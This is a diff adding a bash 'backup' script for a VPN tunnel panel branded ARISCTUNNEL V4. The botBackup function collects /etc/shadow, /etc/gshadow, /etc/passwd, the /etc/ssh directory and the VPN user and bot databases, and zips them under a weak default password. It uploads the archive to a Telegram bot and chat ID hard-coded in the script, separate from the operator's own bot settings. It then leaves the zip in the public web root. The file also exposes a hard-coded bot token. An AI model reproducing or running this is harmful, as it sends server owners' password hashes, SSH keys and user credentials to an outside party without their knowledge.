@@ -1,0 +1,166 @@
+#!/bin/bash
+# COLOR VALIDATION
+clear
+RED='\033[0;31m'
+NC='\033[0m'
+gray="\e[1;30m"
+Blue="\033[0;34m"
+green='\033[0;32m'
+grenbo="\e[92;1m"
+YELL='\033[0;33m'
+BG_BLU="\033[44;1m" # BG BIRU
+# Getting
+domain=$(cat /etc/xray/domain)
+MYIP=$(cat /usr/bin/ipsave)
+IP=$(wget -qO- icanhazip.com)
+dateToday=$(date +"%Y-%m-%d")
+Name=$(curl https://raw.githubusercontent.com/xyzstoree/izin/main/ip | grep $MYIP | awk '{print $2}')
+CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
+KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
+export TIME="10"
+export URL="https://api.telegram.org/bot$KEY/sendMessage"
+# . Liner 
+function baris_panjang() {
+   echo -e "\033[5;36m ———————————————————————————————————————————————\033[0m"
+}
+
+function ARI_Banner() {
+baris_panjang
+NAMASC="ARISCTUNNEL V4"
+function center_text() {
+    local text="$1"
+    local width=50  # Sesuaikan dengan panjang baris yang diinginkan
+
+    # Hapus kode warna untuk menghitung panjang sebenarnya dari teks
+    local plain_text=$(echo -e "$text" | sed 's/\x1b\[[0-9;]*m//g')
+    local len=${#plain_text}
+    local spaces=$(( (width - len) / 2 ))
+
+    # Tampilkan teks dengan warna dan centering yang benar
+    printf "%${spaces}s%s\033[0m\n" "" "$(echo -e "$text")"
+}
+# Kombinasi warna untuk ".::." dan "ARISCTUNNEL V4"
+formatted_text="\e[36m.::.\033[0;35m $NAMASC \e[36m.::."
+# Tampilkan teks yang diformat
+center_text "$formatted_text"
+baris_panjang
+}
+
+function Sc_Credit(){
+sleep 1
+baris_panjang
+function center_text() {
+    local text="$1"
+    local width=50  # Sesuaikan dengan panjang baris yang diinginkan
+
+    # Hapus kode warna untuk menghitung panjang sebenarnya dari teks
+    local plain_text=$(echo -e "$text" | sed 's/\x1b\[[0-9;]*m//g')
+    local len=${#plain_text}
+    local spaces=$(( (width - len) / 2 ))
+
+    # Tampilkan teks dengan warna dan centering yang benar
+    printf "%${spaces}s%s\033[0m\n" "" "$(echo -e "$text")"
+}
+# Kombinasi warna untuk ".::." dan "ARISCTUNNEL V4"
+formatted_text="\033[0;35m Terimakasih sudah menggunakan- \033[0m"
+formatted_text1="\033[0;35m Script Credit By $NAMASC \033[0m"
+# Tampilkan teks yang diformat
+center_text "$formatted_text"
+center_text "$formatted_text1"
+baris_panjang
+}
+clear
+function notif_backup() {
+    sleep 2
+    CHATID="$CHATID"
+KEY="$KEY"
+TIME="$TIME"
+URL="$URL"
+TEXT="
+<code>◇━━━━━━━━━━━━━━◇</code>
+<b>  ⚠️ BACKUP NOTIF⚠️</b>
+<b>     Detail Backup VPS</b>
+<b>USERNAME : ${Name}</b>
+<b>DOAMIN   : ${domain}</b>
+<b>IP       : ${MYIP}</b>
+<b>TODAY    : ${dateToday}</b>
+<b>FILE     : https://${domain}:81/backup.zip</b>
+<code>◇━━━━━━━━━━━━━━◇</code>
+<code>Backup Vps Done</code>
+<code>◇━━━━━━━━━━━━━━◇</code>
+"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://wa.me/ARI_VPN_STORE"},{"text":"Contact","url":"https://wa.me/6281327393959"}]]}'
+
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+}
+clear
+botBackup() {
+    switch=on
+    bottoken=7113550046:AAHnAaNDdndh8R4fbfIELwDH6W1Dwcn4Lx8
+    adminid=1962241851
+    echo -e "[ INFO ] Create password "
+	if [[ -z $InputPass ]]; then
+	InputPass="Ari123Ok"
+	fi
+    echo -e "[ INFO ] • VPS Data Backup... "
+    echo -e "[ INFO ] • Directory Created... "
+    mkdir /root/backup &>/dev/null
+    echo -e "[ INFO ] • VPS Data Backup Start Now... "
+    echo -e "[ INFO ] • Backup In Process Now... "
+	cp /etc/passwd backup/ &>/dev/null
+	echo -e "[ INFO ] • Backup passwd data..."
+	cp /etc/group backup/ &>/dev/null
+	echo -e "[ INFO ] • Backup group data..."
+	cp /etc/shadow backup/ &>/dev/null
+	echo -e "[ INFO ] • Backup shadow data..."
+	cp /etc/gshadow backup/ &>/dev/null
+	echo -e "[ INFO ] • Backup gshadow data..."
+cp /etc/crontab backup/ &>/dev/null
+cp /etc/vmess/.vmess.db backup/ &>/dev/null
+cp /etc/ssh/.ssh.db backup/ &>/dev/null
+cp /etc/vless/.vless.db backup/ &>/dev/null
+cp /etc/trojan/.trojan.db backup/ &>/dev/null
+cp /etc/bot/.bot.db backup/ &>/dev/null
+cp -r /etc/kyt/limit backup/ &>/dev/null
+cp -r /etc/limit backup/qt/ &>/dev/null
+cp -r /etc/ssh backup/ssh &>/dev/null
+cp -r /var/lib/kyt/ backup/kyt  &>/dev/null
+cp -r /etc/xray backup/xray &>/dev/null 
+cp -r /var/www/html/ backup/html &>/dev/null
+cp -r /etc/banner.txt backup/banner.txt &>/dev/null
+cp -r /etc/kyt/limit backup/limit &>/dev/null
+cp -r /etc/vmess backup/vmess &>/dev/null
+cp -r /etc/trojan backup/trojan &>/dev/null
+cp -r /etc/vless backup/vless &>/dev/null
+cp -r /etc/shadowsock backup/shadowsocks &>/dev/null
+cd /root &>/dev/null
+zip -rP "$InputPass" "backup.zip" backup >/dev/null 2>&1
+
+    echo -e "[ INFO ] • Sending Via Bot... "
+    curl -Ss --request POST \
+        --url "https://api.telegram.org/bot${bottoken}/sendDocument?chat_id=${adminid}&caption=USERNAME : $Name%0ADOAMIN : $domain%0AIP : $MYIP%0ABACKUP TODAY : $dateToday%0ALINK FILE : https://${domain}:81/backup.zip" \
+        --header 'content-type: multipart/form-data' \
+        --form document=@"/root/backup.zip" >/root/t1
+
+   # fileId=$(grep -o '"file_id":"[^"]*' /root/t1 | grep -o '[^"]*$')
+
+#    curl -Ss --request GET \
+ #       --url "https://api.telegram.org/bot${bottoken}/getfile?file_id=${fileId}" >/root/t1
+
+ #   filePath=$(grep -o '"file_path":"[^"]'* /root/t1 | grep -o '[^"]*$')
+
+ #   curl -Ss --request GET \
+ #   --url "https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=${adminid}&text=USERNAME : $Name%0ADOAMIN : $domain%0AIP : $MYIP%0ABACKUP TODAY : $dateToday%0AFile ID   : <code>${fileId}</code>%0AFile Path : <code>${filePath}</code>&parse_mode=html" &>/dev/null
+clear
+    echo -e "[ INFO ] • Completed Backup... "
+  #  echo -e "USERNAME  : ${Name}"
+ # echo -e "FILE    : https://${domain}:81/backup.zip"
+#    echo -e "IP        : ${MYIP}"
+#    echo -e "TODAY     : ${dateToday}"
+#    echo -e "File ID   : ${fileId}"
+#    echo -e "File Path : ${filePath}"
+    rm -rf /root/backup
+    mv /root/backup.zip /var/www/html/backup.zip
+    rm -f /root/t1
+}
+    botBackup
+    notif_backup
